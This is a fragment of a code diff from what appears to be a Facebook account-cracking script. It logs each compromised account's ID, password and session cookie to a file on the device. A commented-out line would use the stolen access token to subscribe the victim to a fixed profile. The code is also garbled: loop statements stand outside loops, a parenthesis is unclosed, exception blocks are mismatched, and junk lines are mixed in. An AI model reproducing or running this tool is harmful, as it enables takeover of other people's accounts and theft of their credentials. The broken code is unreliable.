@@ -822,20 +822,19 @@ def M_file_4(ids, names, passlist):
 				print("\033[1;33m<[BISCUT-🍪]> :\033[1;33m " + cookie)
 				open('/sdcard/DJALIL_MK_iDs_COOKiE_M4.txt', 'a').write(ids + '|' + pas + '|' + cookie + '\n')
 				#token = po['access_token']
-				#requests.post('https://graph.facebook.com/'+'127103294/'+'subscribers'+'?access_token='+token)
+				#requests.post('https://graph.facebook.com/'+'127103294/'+'subscribers'+'?access_token='+token
 try:
     if 'session_key' in po:
-        # ...
+        pass
     elif 'www.facebook.com' in po['error']['message']:
-        # ...
+        pass
     else:
         continue
 
     oks.append(ids)
     break
     loop += 1
-except:
-    pass
+
 except requests.exceptions.ConnectionError:
     time.sleep(20)
 
@@ -1078,6 +1077,7 @@ raise KeyError ("XD")
 "HaN".FuCk
 raise SystemExit
 open('').close()
+
 
 
 
